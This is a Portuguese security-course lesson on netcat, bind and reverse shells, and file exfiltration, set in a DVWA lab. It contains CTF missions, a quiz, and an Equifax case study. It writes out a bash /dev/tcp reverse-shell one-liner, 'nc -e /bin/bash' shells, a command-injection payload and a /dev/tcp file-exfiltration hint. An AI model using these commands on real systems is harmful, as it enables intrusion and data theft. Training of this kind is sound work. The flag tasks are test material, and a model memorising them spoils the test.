@@ -1,0 +1,569 @@
+---
+slug: netcat-e-shells
+track: trilha-2
+title: "netcat, shells e transferência de arquivos"
+prerequisites: [linux-processos-e-pacotes, kali-linux]
+lab: dvwa
+tasks:
+  - slug: missao-1-conversa-crua
+    title: "Missão 1 — A conversa crua"
+    type: flag
+    prompt: "Fale HTTP na mão com o DVWA usando só o netcat (sem navegador, sem curl) e leia a primeira linha da resposta e o cabeçalho Location. A flag é FLAG{status-destino}, com o código de status e o valor do Location (por exemplo FLAG{200-index.php})."
+    hint: "Peça a raiz do site com um pedido HTTP/1.0 escrito por você e mande para a porta 80 do dvwa pelo netcat. Como você não está logado, o servidor não entrega a página: responde com um redirecionamento. O número que vem depois de HTTP/1.1 e o arquivo que aparece no cabeçalho Location formam a flag."
+    flag:
+      hash: "scrypt$16384$8$1$30384bc673580c6dc128abe62f1916c65ea9390a9134fa744903073a9f84a6bf"
+      salt: "cb43a99aeff9f832b677d6346317b2e3"
+  - slug: missao-2-de-rce-a-shell
+    title: "Missão 2 — De um comando a um shell"
+    type: flag
+    prompt: "Transforme a injeção de comando do DVWA num reverse shell que volta ao seu Kali e, dentro dele, descubra com que usuário o servidor web roda e qual o codinome (codename) da distribuição Linux do alvo. A flag é FLAG{usuario-codinome} (por exemplo FLAG{nobody-bookworm})."
+    hint: "No Kali, suba um listener com netcat. No campo de ping da página Command Injection, encadeie um comando que faça o alvo conectar de volta ao seu listener — o alvo tem bash, então pense em bash -i e /dev/tcp. Com o shell aberto, id mostra o usuário e /etc/os-release traz o campo VERSION_CODENAME."
+    flag:
+      hash: "scrypt$16384$8$1$69f0ed8718f7e978ee6373c0282afa1aae4b4406693652b6b6c0c47bd7dd5a39"
+      salt: "60c3f8cbba8e0dd34801e5822926a0ba"
+  - slug: missao-3-exfiltracao-provada
+    title: "Missão 3 — A exfiltração provada"
+    type: flag
+    prompt: "Use o shell para transferir o arquivo /var/www/html/favicon.ico do DVWA de volta ao seu Kali e prove, pelo SHA-256, que ele chegou inteiro. A flag é FLAG{favicon-hash8}, com os 8 primeiros caracteres do SHA-256 do arquivo recebido (por exemplo FLAG{favicon-deadbeef})."
+    hint: "No Kali, deixe um netcat à escuta gravando a saída num arquivo (nc -lvnp PORTA > loot). No alvo, mande o arquivo pelo mesmo canal do reverse shell: cat do favicon redirecionado para /dev/tcp, dentro de um bash -c. Depois, sha256sum no arquivo recebido; os 8 primeiros caracteres entram na flag."
+    flag:
+      hash: "scrypt$16384$8$1$8e5f7e85f3df6e790b1597e0a6d17f4c6ec987fb3f4a3758c6cadf1ca182a4a0"
+      salt: "1d2f2ba3e381b2a0fd5d7c5150343850"
+  - slug: quiz-final
+    title: "Quiz — netcat, shells e transferência de arquivos"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Qual é a diferença essencial entre um bind shell e um reverse shell?"
+        options:
+          - "O bind shell é criptografado e o reverse shell não"
+          - "No bind shell o alvo abre uma porta e escuta, e o atacante conecta nele; no reverse shell o atacante escuta e o alvo é quem conecta de volta"
+          - "O reverse shell só funciona em Windows"
+          - "São dois nomes para a mesma coisa"
+        answer: 1
+        explanation: "O que distingue os dois é quem inicia a conexão. No bind shell, o alvo é o servidor (escuta) e o atacante é o cliente (conecta). No reverse shell, os papéis se invertem: o atacante escuta e o alvo conecta de volta. Criptografia não faz parte da definição de nenhum dos dois (netcat puro não cifra nada)."
+      - question: "Por que, num pentest real pela internet, o reverse shell quase sempre funciona e o bind shell quase sempre falha?"
+        options:
+          - "Porque o reverse shell é mais novo"
+          - "Porque o firewall de borda costuma barrar conexões que chegam de fora (entrada) mas deixar passar as que saem (saída); o bind shell precisa de entrada, o reverse shell usa saída"
+          - "Porque o bind shell consome mais memória"
+          - "Porque o reverse shell não precisa de porta"
+        answer: 1
+        explanation: "Firewalls e NAT tratam entrada e saída de formas diferentes: bloqueiam quase toda conexão iniciada de fora, mas permitem as que a própria rede inicia para fora. O bind shell exige que o atacante conecte de fora para dentro (barrado); o reverse shell faz o alvo conectar de dentro para fora (permitido). Por isso a defesa certa é controlar a saída (egress filtering)."
+      - question: "No lab, por que a transferência de arquivo com `cat arquivo > /dev/tcp/IP/PORTA` só funcionou quando envolvida em `bash -c`?"
+        options:
+          - "Porque /dev/tcp é um arquivo que precisa ser criado antes"
+          - "Porque /dev/tcp é um recurso do bash, e a injeção de comando do DVWA roda sob /bin/sh (dash), que não o entende; só o bash abre a conexão"
+          - "Porque faltava sudo"
+          - "Porque o arquivo era binário"
+        answer: 1
+        explanation: "/dev/tcp não é um arquivo de verdade nem um recurso do kernel: é uma mágica do bash, que ao ver esse caminho numa redireção abre um socket TCP. O dash, usado pelo shell_exec do PHP, não tem esse recurso e trataria /dev/tcp como um caminho comum, que não existe. Por isso o payload precisa chamar bash explicitamente."
+      - question: "O reverse shell abriu, mas Ctrl-C mata a sua sessão inteira, não há tab e a senha aparece na tela quando você digita. O que está acontecendo?"
+        options:
+          - "O shell está infectado"
+          - "É um shell sem terminal (sem PTY): o bash do alvo não tem um pseudo-terminal, então faltam job control, edição de linha e eco controlado; a solução é fazer o upgrade para um PTY"
+          - "A conexão está lenta"
+          - "Falta instalar o bash no Kali"
+        answer: 1
+        explanation: "Um reverse shell cru é um 'dumb shell': o bash roda sem um PTY (pseudo-terminal), então o Ctrl-C vai para o seu netcat (e derruba tudo), não há histórico nem tab, e o terminal não sabe esconder a senha. A mensagem 'cannot set terminal process group' e 'no job control' é o próprio bash avisando disso. O upgrade (script, ou python pty.spawn) resolve."
+      - question: "O netcat é descrito como um 'canivete suíço do TCP/IP'. O que isso quer dizer na prática?"
+        options:
+          - "Que ele corta cabos de rede"
+          - "Que ele lê e escreve em conexões TCP e UDP cruas, servindo de listener, de cliente, de scanner de portas, de meio de transferência de arquivo e de base para shells — um tijolo genérico de rede"
+          - "Que ele só serve para HTTP"
+          - "Que ele substitui o Wireshark"
+        answer: 1
+        explanation: "netcat é proposital e minimalista: ele só move bytes entre o terminal e um socket TCP/UDP. Essa simplicidade é a força — por cima dela você monta banner grabbing, transferência de arquivo, listeners e shells. Ele não analisa protocolos (isso é o Wireshark) nem cifra nada; é um tijolo que você combina com outras coisas."
+      - question: "Qual defesa ataca a causa raiz da cadeia que você montou no lab (injeção de comando → shell)?"
+        options:
+          - "Bloquear a porta 4444 no firewall do atacante"
+          - "Corrigir a injeção de comando na aplicação (não passar entrada do usuário a um shell; usar APIs seguras e validação por allowlist), somada a egress filtering para cortar o reverse shell mesmo se a injeção escapar"
+          - "Trocar o netcat por uma versão mais nova no alvo"
+          - "Renomear o binário do bash"
+        answer: 1
+        explanation: "O shell foi só a consequência; a porta de entrada foi a injeção de comando. A defesa de fundo é a aplicação não entregar entrada do usuário a um shell (ping por biblioteca, não por shell_exec; validação de IP por allowlist). Em profundidade, o egress filtering corta a conexão de saída do reverse shell, e a detecção de processos filhos anômalos do servidor web pega o resto. Bloquear uma porta no atacante ou renomear binários não resolve nada."
+glossary:
+  - term: netcat
+    definition: "Utilitário de rede que lê e escreve em conexões TCP e UDP cruas. Serve de listener, de cliente, de scanner de portas, de meio de transferência de arquivo e de base para shells. Apelidado pelo autor de 'canivete suíço do TCP/IP'."
+  - term: listener
+    definition: "O lado de uma conexão que abre uma porta e fica esperando alguém conectar (o servidor). No netcat, é o modo -l; o outro lado é o cliente, que inicia a conexão."
+  - term: bind shell
+    definition: "Shell remoto em que o alvo abre uma porta e fica à escuta, e o atacante conecta nessa porta para receber a linha de comando. Precisa que o firewall do alvo aceite conexões de entrada, o que raramente acontece na borda."
+  - term: reverse shell
+    definition: "Shell remoto em que o atacante fica à escuta e o alvo é quem inicia a conexão de volta, de dentro para fora. Como firewalls costumam liberar a saída, é o formato que funciona na prática."
+  - term: remote code execution
+    definition: "Remote Code Execution (RCE): a capacidade de um atacante executar comandos ou código à sua escolha numa máquina alvo, pela rede. Injeção de comando e muitas CVEs de servidor levam a RCE."
+  - term: PTY
+    definition: "Pseudo-terminal (pseudo-teletype): par de dispositivos que o sistema cria para que um programa converse com um 'terminal' que na verdade é outro programa. É o que dá a um shell o Ctrl-C, o histórico, o tab e o eco controlado de senha. Um reverse shell cru não tem um, e por isso é um 'dumb shell' até ser melhorado."
+---
+
+import bindVsReverse from "./img/bind-vs-reverse.svg";
+import cadeia from "./img/cadeia-rce-shell.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Em 13 de maio de 2017, atacantes entraram na rede da **Equifax**, uma das maiores empresas de crédito do mundo, por uma falha num servidor web. Não bastou "entrar": para ficar, eles plantaram cerca de **30 web shells** — pontos de controle remoto por onde mandavam comandos — e permaneceram **76 dias sem serem notados**, tempo em que acessaram dados de pelo menos **145,5 milhões de pessoas** (seção 4). A distância entre "achei uma falha que executa um comando" e "tenho controle remoto contínuo da máquina" é exatamente o tema deste módulo. A ferramenta mais antiga e mais honesta para cruzar essa distância se chama **netcat**.
+
+No 2.1 você conheceu o Kali e suas ferramentas; no 0.4 você aprendeu a ver processos, usuários e a estrutura de um Linux. Aqui você junta as duas coisas: vai descobrir que uma <GlossaryTerm term="remote code execution">execução remota de comando</GlossaryTerm> (*remote code execution*, ou RCE) só vira poder de verdade quando você consegue um **shell** — uma linha de comando interativa na máquina alvo — e vai aprender a abrir, melhorar e alimentar esse shell com o <GlossaryTerm term="netcat">netcat</GlossaryTerm> e seus primos. É um dos módulos mais "mão na massa" da trilha: quase tudo aqui é digitado e visto acontecer.
+
+**Ao final, você vai saber:**
+
+- explicar o que é o netcat e por que um programa tão simples é tão central em segurança ofensiva;
+- usar o netcat como <GlossaryTerm term="listener">listener</GlossaryTerm> e como cliente, e falar protocolos de texto (como HTTP) na mão;
+- diferenciar <GlossaryTerm term="bind shell">bind shell</GlossaryTerm> de <GlossaryTerm term="reverse shell">reverse shell</GlossaryTerm> e explicar por que o reverse vence na vida real;
+- transformar uma injeção de comando numa aplicação web num reverse shell interativo;
+- reconhecer um "dumb shell" e fazer o *upgrade* dele para um <GlossaryTerm term="PTY">PTY</GlossaryTerm> de verdade;
+- transferir arquivos entre as duas pontas por vários caminhos (netcat, bash `/dev/tcp`, HTTP) e provar a integridade com SHA-256;
+- defender: corrigir a causa raiz (a injeção), cortar a saída com *egress filtering* e detectar o shell no servidor.
+
+**Pré-requisitos (relembrando em uma linha cada):**
+
+- **0.4 — Linux: processos, pacotes e edição:** o que é um processo, usuários e permissões (o `id`, o usuário `www-data`), e ler arquivos do sistema como `/etc/os-release`. Você usa isso o tempo todo dentro do shell.
+- **2.1 — Kali Linux e organização do ambiente:** o Kali do lab, as redes `desktop_net` e `lab_net`, o `sudo` dentro do contêiner e como o lab isola o alvo. Portas, TCP e o *three-way handshake* você viu no 0.2 (Trilha 0) e eles voltam aqui em uma linha quando aparecem.
+
+**Tempo estimado:** 3 horas, incluindo o laboratório.
+
+<Callout variant="ethics" title="Abrir um shell numa máquina sem autorização é crime">
+Conseguir um shell numa máquina é cruzar a fronteira do "só olhei" para o "tomei o controle". No Brasil, isso cai direto no art. 154-A do Código Penal (invasão de dispositivo informático, incluído pela Lei 12.737/2012 e endurecido pela Lei 14.155/2021), e o que você faz depois (copiar dados, instalar backdoor) agrava a pena. Tudo neste módulo só é legítimo no laboratório local, que é seu, ou num pentest com autorização por escrito e escopo definido (1.3). Reverse shell, web shell e exfiltração em sistema alheio, nunca.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 O que é o netcat, e por que um programa tão simples importa tanto
+
+O <GlossaryTerm term="netcat">netcat</GlossaryTerm> (comando `nc`) faz uma coisa só, e faz muito bem: liga a entrada e a saída padrão do seu terminal a um <GlossaryTerm term="socket">socket</GlossaryTerm> de rede. "Socket" é o nome do ponto de conexão que o sistema abre para um programa falar pela rede, identificado por um IP e uma porta (0.2). O que você digita, o `nc` manda pela conexão; o que chega pela conexão, ele escreve na sua tela. Só isso.
+
+Essa simplicidade é justamente o motivo de ele ser tão usado. Como o `nc` não sabe nada sobre HTTP, FTP, SMTP ou qualquer protocolo — ele só move bytes —, você pode usá-lo para falar **qualquer** protocolo de texto na mão, para abrir uma porta e escutar, para conectar numa porta e ver o que responde, para passar um arquivo de uma máquina a outra, ou para servir de cano por onde um shell conversa. É o que o autor quis dizer ao chamá-lo de "canivete suíço do TCP/IP": não é uma ferramenta especializada, é um tijolo genérico que você combina com os outros.
+
+O netcat foi escrito por alguém que assina como *Hobbit*; a versão clássica, a **1.10**, é de **20 de março de 1996** (seção 4). Trinta anos depois, ele continua na primeira página de qualquer curso de pentest. Vale separar o `nc` de duas ferramentas vizinhas que você já viu ou vai ver: o **Wireshark** (2.6) **analisa** o tráfego, decodificando protocolos; o **nmap** (2.4) **descobre** portas e serviços. O netcat não faz nem uma coisa nem outra: ele **conversa**. Onde o Wireshark é o microfone escondido e o nmap é a batida na porta, o netcat é a conversa em si.
+
+<Callout variant="info" title="Duas famílias de netcat, e por que isso vai te morder">
+Com o tempo, o `nc` se dividiu em duas implementações principais, e elas não são idênticas. A **netcat-traditional** (a linhagem original) tem a opção `-e`, que executa um programa e liga a entrada e a saída dele ao socket — é o atalho clássico para shells. A **netcat-openbsd** (reescrita pelo projeto OpenBSD por segurança) **removeu** o `-e`, considerado perigoso demais. O Kali do lab traz a tradicional: o comando `nc` aponta para o `nc.traditional`. Em outras máquinas, `nc -e` pode simplesmente não existir — e aí você precisa das alternativas da seção 3. Guarde isso: metade dos "meu reverse shell não funciona" é essa diferença.
+</Callout>
+
+### 2.2 Shell: o que é, e por que uma RCE "cega" não basta
+
+Um **shell** é o interpretador de linha de comando (o `bash`, o `sh`): o programa que lê o que você digita, executa e devolve a saída. Quando você está sentado na máquina, o shell é óbvio. O problema do atacante é que, muitas vezes, o que ele consegue primeiro não é um shell, e sim uma **execução de um comando de cada vez, cega**.
+
+Pense na injeção de comando que você vai explorar no lab: um campo de formulário que deveria receber um IP para dar `ping`, mas que deixa você anexar `; id` e ver o resultado. Isso é uma RCE — você roda comandos no servidor. Mas é desconfortável: cada comando é uma requisição web nova, sem estado (o diretório atual não "gruda" de um comando para o outro), sem histórico, sem a chance de rodar um programa interativo (um editor, um `sudo` que pede senha, um `mysql`). É como falar com alguém por bilhetes passados por baixo da porta: dá para trocar mensagens, mas não é uma conversa.
+
+Um shell interativo resolve isso. Com ele, você tem uma sessão contínua: muda de diretório e ele lembra, roda programas que pedem entrada, encadeia comandos. Transformar a RCE "de bilhete" num shell interativo é o primeiro movimento depois de achar a falha. E o veículo clássico desse movimento é o netcat, dos dois lados do cano.
+
+### 2.3 Bind shell × reverse shell: quem liga para quem
+
+Há duas formas de montar esse cano, e a diferença entre elas é uma só pergunta: **quem inicia a conexão?**
+
+No <GlossaryTerm term="bind shell">bind shell</GlossaryTerm>, o **alvo** abre uma porta e fica à escuta (vira servidor), com um shell "amarrado" (*bind*) a ela. O atacante é o cliente: conecta naquela porta e cai no shell. Parece natural, mas tem um problema fatal na vida real: para o atacante conectar, o firewall do alvo precisa **aceitar uma conexão vinda de fora**, naquela porta. Firewalls de borda e NAT (0.2) existem justamente para barrar isso. Resultado: o bind shell quase nunca atravessa a borda de uma rede séria.
+
+No <GlossaryTerm term="reverse shell">reverse shell</GlossaryTerm>, os papéis se invertem. O **atacante** abre a porta e escuta (no Kali); o **alvo** é quem **conecta de volta**, de dentro para fora. Por que isso muda tudo? Porque firewalls tratam entrada e saída de formas diferentes: barram quase toda conexão iniciada de fora, mas deixam a rede interna iniciar conexões para fora (é assim que as pessoas navegam). O reverse shell pega carona nesse sentido liberado. Por isso ele é o formato padrão em pentest.
+
+<Figure
+  src={bindVsReverse}
+  alt="Dois cenários lado a lado, com o atacante à esquerda e o alvo à direita, e um firewall de borda no meio que barra conexões de entrada e deixa passar as de saída. No bind shell, o alvo escuta e o atacante conecta de fora para dentro; a seta bate no firewall e é barrada. No reverse shell, o atacante escuta e o alvo conecta de dentro para fora; a seta acompanha o sentido liberado e passa. A conclusão: o que decide é quem inicia a conexão, porque o firewall trata entrada e saída de formas diferentes."
+  caption="Bind contra reverse: o que separa os dois não é onde o shell roda, mas quem dá o primeiro passo da conexão — e o firewall de borda trata entrada e saída de formas opostas."
+/>
+
+Há uma sutileza que o lab vai deixar clara: **dentro da mesma rede, sem firewall no meio, os dois funcionariam.** No nosso lab o Kali e o DVWA estão na mesma `lab_net` interna, então a borda não atrapalha. Mesmo assim você vai usar o reverse shell — e por um motivo concreto do alvo, não da rede: o contêiner do DVWA **não tem o netcat instalado**, então não há como ele abrir um bind shell com `nc`. Quem tem netcat é o Kali. Essa restrição (o alvo quase nunca tem as ferramentas que você gostaria) é a regra, não a exceção, e molda tudo na seção 3.
+
+### 2.4 Dumb shell e o PTY: por que o primeiro shell é sempre meio quebrado
+
+Quando o reverse shell abre, a alegria dura até você apertar `Ctrl-C` e a sessão inteira morrer. O primeiro shell que você ganha é quase sempre um **"dumb shell"**: um `bash` rodando **sem um terminal de verdade** atrás dele.
+
+Para entender, é preciso saber o que é um <GlossaryTerm term="PTY">PTY</GlossaryTerm> (*pseudo-terminal*). Quando você abre um terminal no seu computador, o sistema cria um par de dispositivos — um pseudo-terminal — que fica entre o seu teclado/tela e o shell. É esse PTY que dá os recursos que você nem percebe que usa: o `Ctrl-C` que interrompe só o programa da vez (*job control*), o histórico com as setas, o `tab` que completa nomes, e o **eco controlado**, que esconde a senha quando um programa a pede.
+
+No reverse shell cru não há PTY. O `bash` do alvo foi lançado por um comando web, sem terminal associado. Ele mesmo avisa, logo que conecta:
+
+```text
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+```
+
+Traduzindo: "não consegui configurar o controle de terminal; não há job control". Na prática, isso significa que `Ctrl-C` vai para o seu `nc` (e derruba o listener), que não há histórico nem `tab`, e que qualquer senha digitada aparece na tela. Dá para trabalhar, mas é frágil. O conserto é fazer o **upgrade** do shell: pedir ao alvo que crie um PTY e rode o `bash` dentro dele. A ferramenta mais comum para isso é o `python3` com `pty.spawn`; quando ele não existe (é o caso do DVWA), o utilitário `script` resolve. Você faz esse upgrade na seção 5.
+
+## 3. Como o ataque funciona — a mecânica
+
+Vamos construir cada peça, do mais simples ao shell completo. Os comandos abaixo foram rodados no Kali do lab; onde aparecem endereços, o Kali é `10.0.0.2` e o DVWA é `10.0.0.3` (no seu lab os IPs reais são outros — você os descobre na seção 5).
+
+### 3.1 O listener e o cliente: a conversa mais simples
+
+O coração do netcat são dois modos. Como **listener**, ele abre uma porta e espera:
+
+```console
+$ nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+As letras valem ouro e vão te acompanhar o módulo inteiro: `-l` = *listen* (seja o servidor), `-v` = *verbose* (mostre quem conectou), `-n` = não resolva nomes (mais rápido, sem DNS), `-p 4444` = a porta. Do outro lado, o **cliente** conecta num IP e porta:
+
+```console
+$ nc 10.0.0.3 80
+```
+
+O que você digitar de um lado aparece no outro. É um bate-papo cru por TCP — e é essa a base de tudo o que vem a seguir.
+
+### 3.2 Banner grabbing: falar HTTP na mão
+
+Como o `nc` só move bytes, você pode escrever um pedido HTTP com as próprias mãos e ver a resposta do servidor sem navegador nenhum. Isso se chama *banner grabbing* quando o objetivo é descobrir o software e a versão do serviço:
+
+```console
+$ printf 'HEAD / HTTP/1.0\r\nHost: dvwa\r\n\r\n' | nc -q1 dvwa 80
+HTTP/1.1 302 Found
+Date: Mon, 05 Oct 2026 02:16:43 GMT
+Server: Apache/2.4.68 (Debian)
+X-Powered-By: PHP/8.5.10
+Set-Cookie: security=low; path=/
+Location: login.php
+Connection: close
+Content-Type: text/html; charset=UTF-8
+```
+
+Duas coisas valem nota. O `-q1` diz ao `nc` para fechar 1 segundo depois que a entrada acaba (sem ele, o cliente fica pendurado esperando mais digitação). E o `\r\n` é obrigatório: o HTTP separa linhas com *carriage return* + *line feed*, não só `\n`. Repare no que o servidor entrega de graça: `Server: Apache/2.4.68 (Debian)` e `X-Powered-By: PHP/8.5.10` — as mesmas versões que você leu nos pacotes do Wireshark no 2.6, agora obtidas **conversando** com o servidor em vez de **espionar** a rede.
+
+### 3.3 Transferência de arquivo com netcat, dos dois lados
+
+Se o `nc` liga stdin/stdout a um socket, transferir um arquivo é só redirecionar. No lado que **recebe**, o listener grava o que chega num arquivo; no lado que **envia**, o cliente lê o arquivo para dentro da conexão:
+
+```console
+$ nc -lvnp 4447 > received.txt
+```
+
+```console
+$ nc -q1 10.0.0.2 4447 < report.txt
+```
+
+Quando o cliente termina de enviar e fecha, o listener vê o fim da conexão e grava o arquivo. O jeito honesto de saber se chegou **inteiro** é comparar o <GlossaryTerm term="SHA-256">SHA-256</GlossaryTerm> dos dois lados — se baterem, é bit a bit idêntico:
+
+```console
+$ sha256sum report.txt received.txt
+e514092f6f9b9d2c81a9634ba035cf4d00c41b0ed25aae64dea3ed5f2eb1281a  report.txt
+e514092f6f9b9d2c81a9634ba035cf4d00c41b0ed25aae64dea3ed5f2eb1281a  received.txt
+```
+
+Esse é o caso em que **os dois lados têm netcat**. No lab, o alvo não tem — então, na seção 5, você vai usar a mesma ideia com uma ponta de netcat (no Kali) e a outra ponta falando por `/dev/tcp` do bash (no alvo).
+
+### 3.4 O bind shell com netcat
+
+Juntando o `-e` com o `-l`, o netcat tradicional amarra um shell à porta. Para ver a mecânica sem depender do alvo, dá para demonstrar tudo dentro do próprio Kali: um processo abre o bind shell, outro conecta:
+
+```console
+$ nc -lvnp 4446 -e /bin/bash &
+$ printf 'id\nhostname\n' | nc -q1 127.0.0.1 4446
+uid=1000(kali) gid=1000(kali) groups=1000(kali),27(sudo)
+kali
+```
+
+O que aconteceu: o primeiro `nc` ficou à escuta na porta 4446 com um `/bin/bash` amarrado; o segundo conectou e mandou dois comandos, que o bash do outro lado executou e devolveu. É exatamente um bind shell — só que local, para você ver o mecanismo. Num alvo de verdade pela internet, lembre da seção 2.3: o firewall barraria o segundo `nc`.
+
+### 3.5 O reverse shell
+
+No reverse shell, o Kali escuta e o alvo conecta de volta. No Kali:
+
+```console
+$ nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+No alvo, você precisa de um comando que abra uma conexão para o Kali e ligue um shell a ela. Com o netcat tradicional seria `nc 10.0.0.2 4444 -e /bin/bash`. Mas, como muitos alvos (o DVWA entre eles) não têm `nc`, o payload mais portátil usa um recurso do próprio bash, o `/dev/tcp`:
+
+```bash
+bash -i >& /dev/tcp/10.0.0.2/4444 0>&1
+```
+
+Vale destrinchar, porque esse é o one-liner mais famoso da segurança ofensiva. `bash -i` abre um bash interativo. `/dev/tcp/10.0.0.2/4444` **não é um arquivo**: é uma mágica do bash que, ao ver esse caminho numa redireção, abre um socket TCP para aquele IP e porta. `>&` manda a saída e os erros para esse socket; `0>&1` manda a entrada para virem de lá também. Resultado: o bash lê os comandos que chegam pela conexão e devolve a saída por ela — um shell, pela rede, de dentro para fora. É o que você monta na missão 2.
+
+<Callout variant="warning" title="/dev/tcp é do bash, não do sh">
+O `/dev/tcp` só existe no `bash` (e mesmo assim precisa ter sido compilado com ele, o que é o padrão). O `/bin/sh` da maioria dos sistemas é o `dash`, que **não** tem esse recurso. Como você vai ver no lab, a injeção de comando do PHP roda sob `sh`, então o payload precisa chamar o `bash` explicitamente (`bash -c "..."`). Esquecer isso é a causa número um de "o reverse shell não conecta".
+</Callout>
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### A origem: o "canivete suíço do TCP/IP" (1996)
+
+O netcat não é uma ferramenta de boutique moderna: é um clássico que atravessou gerações. A versão de referência, a **1.10**, foi publicada em **20 de março de 1996** por um autor que assina como *Hobbit*. O próprio arquivo de distribuição carrega a assinatura `_H* 960320 v1.10 RELEASE` (ano 96, mês 03, dia 20) e abre descrevendo o programa como o "**TCP/IP swiss army knife**" — o canivete suíço do TCP/IP. É dele que vem o apelido usado até hoje. A lição histórica é simples e vale para a carreira: ferramentas minimalistas e bem pensadas envelhecem muito bem, porque fazem uma coisa e se combinam com tudo.
+
+- **Fonte:** [Netcat 1.10 — página e README originais (Hobbit)](https://nc110.sourceforge.io/).
+
+### Equifax: de uma falha web a 76 dias de controle remoto (2017)
+
+O melhor exemplo de por que este módulo importa não é sobre o netcat em si, mas sobre o que ele representa: transformar a execução de um comando em **controle remoto contínuo**. Em 2017, a Equifax sofreu uma das maiores violações de dados da história, e a cadeia foi exatamente essa.
+
+A porta de entrada foi a **CVE-2017-5638**, uma falha de execução remota de código (RCE) no *Jakarta Multipart parser* do **Apache Struts 2**: um `Content-Type` malicioso numa requisição de upload fazia o servidor executar comandos, **sem precisar de autenticação**. A Apache publicou o aviso **S2-045** e a correção em **6 de março de 2017**; no dia seguinte já havia *proof of concept* e módulo de Metasploit públicos. A Equifax não corrigiu a tempo.
+
+Em **13 de maio de 2017**, atacantes exploraram essa RCE num portal de contestação de crédito (o sistema ACIS) e, a partir do comando que conseguiam executar, plantaram **cerca de 30 web shells** — <GlossaryTerm term="web shell">web shells</GlossaryTerm>, páginas que aceitam comandos pela web e funcionam como shells persistentes. Com esse controle, acharam um arquivo com credenciais **em texto claro** e usaram para alcançar outros bancos de dados. Ficaram **76 dias sem serem detectados** (de maio a julho de 2017), rodando milhares de consultas, e levaram dados pessoais de **pelo menos 145,5 milhões** de pessoas.
+
+- **Impacto:** dados (nomes, CPF/SSN, datas de nascimento, endereços e, para parte, números de carteira de motorista e cartão) de 145,5 milhões de pessoas; multas e acordos de centenas de milhões de dólares.
+- **Lição:** o shell é só a consequência; a causa foi uma RCE não corrigida e a ausência de controles que detectassem a criação dos web shells. A mesma mecânica que você monta no lab (RCE → shell persistente → exfiltração) foi a espinha dorsal do incidente.
+- **Fontes:** [U.S. House Committee on Oversight — relatório do caso Equifax, dez/2018](https://oversight.house.gov/wp-content/uploads/2018/12/Equifax-Report.pdf); [U.S. GAO, GAO-18-559, ago/2018](https://www.gao.gov/products/gao-18-559); [Apache Struts S2-045](https://struts.apache.org/docs/s2-045.html).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** ao terminar, você terá falado HTTP na mão com o netcat, transformado a injeção de comando do DVWA num reverse shell interativo de volta ao seu Kali, melhorado esse shell para um PTY, e exfiltrado um arquivo do alvo provando a integridade por SHA-256 — três flags no caminho.
+
+<Figure
+  src={cadeia}
+  alt="A cadeia do laboratório em cinco etapas. 1: no Kali, um listener de netcat espera numa porta. 2: o atacante usa a injeção de comando no formulário de ping do DVWA para rodar comandos como www-data. 3: o comando injetado é um reverse shell com bash e /dev/tcp, que faz o DVWA conectar de volta ao Kali pela lab_net, nascendo um shell burro. 4: o shell é melhorado com o comando script, que aloca um PTY. 5: com o shell, arquivos do alvo são transferidos de volta ao Kali e conferidos com sha256. O alvo só tem bash, perl, php e curl; não tem nc nem python3."
+  caption="O mapa das missões: de um listener e uma injeção de comando até um shell completo e a exfiltração. As setas verdes são conexões que partem do alvo para o Kali."
+/>
+
+### 5.1 Subir o laboratório (passo a passo)
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar**. O lab `dvwa` sobe o Kali e o DVWA na mesma rede interna, e o desktop do Kali abre ali mesmo, pelo navegador. (Pela regra de um lab por vez, pare outro lab se houver um rodando. No terminal, o equivalente é `scripts/lab.sh up dvwa`.)
+2. No Kali, abra um terminal. Descubra os endereços das duas pontas:
+
+```console
+$ ip -brief addr
+lo               UNKNOWN        127.0.0.1/8 ::1/128
+eth0             UP             10.10.0.2/16
+eth1             UP             10.0.0.2/16
+$ getent hosts dvwa
+10.0.0.3        dvwa
+```
+
+O Kali tem duas interfaces: a `eth0` fica na `desktop_net` (por onde o Guacamole mostra a tela) e a `eth1` fica na `lab_net`, a rede interna que fala com o alvo. Guarde o IP da **sua** `eth1` (a que fala com o DVWA) — é o endereço para onde o reverse shell vai voltar. No texto, uso `10.0.0.2` para o Kali e `10.0.0.3` para o DVWA; **os seus serão diferentes**. Confirme que o Kali tem o netcat tradicional:
+
+```console
+$ readlink -f $(which nc)
+/usr/bin/nc.traditional
+```
+
+### 5.2 Missão 1 — a conversa crua (guiado)
+
+Antes de qualquer exploit, sinta o netcat conversando. Peça a página inicial do DVWA escrevendo o HTTP na mão e mandando pela porta 80 — sem navegador, sem `curl`:
+
+```console
+$ printf 'GET / HTTP/1.0\r\nHost: dvwa\r\n\r\n' | nc -q1 dvwa 80
+HTTP/1.1 302 Found
+Date: ...
+Server: Apache/2.4.68 (Debian)
+X-Powered-By: PHP/8.5.10
+Set-Cookie: security=low; path=/
+Location: login.php
+Connection: close
+```
+
+Como você não está logado, o DVWA não entrega a página: ele responde com um **redirecionamento**. A primeira linha traz o código de status, e o cabeçalho `Location` diz para onde o navegador deveria ir. Esses dois valores são a sua primeira flag, no formato `FLAG{status-destino}`.
+
+<FlagInput task="missao-1-conversa-crua" />
+
+### 5.3 Missão 2 — de um comando a um shell (desafio)
+
+Agora o movimento central. No navegador do Kali, entre no DVWA (`http://dvwa/`, usuário `admin`, senha `password`), confirme que o **DVWA Security** está em **low** (menu *DVWA Security*) e abra **Command Injection**. O campo pede um IP para dar `ping`. Primeiro, confirme a injeção: em vez de só um IP, mande `127.0.0.1; id`.
+
+```text
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms
+...
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3072ms
+rtt min/avg/max/mdev = 0.037/0.077/0.190/0.065 ms
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+O `; id` rodou: o servidor executa seus comandos como o usuário `www-data`. Isso é uma RCE "de bilhete" — agora transforme-a num shell.
+
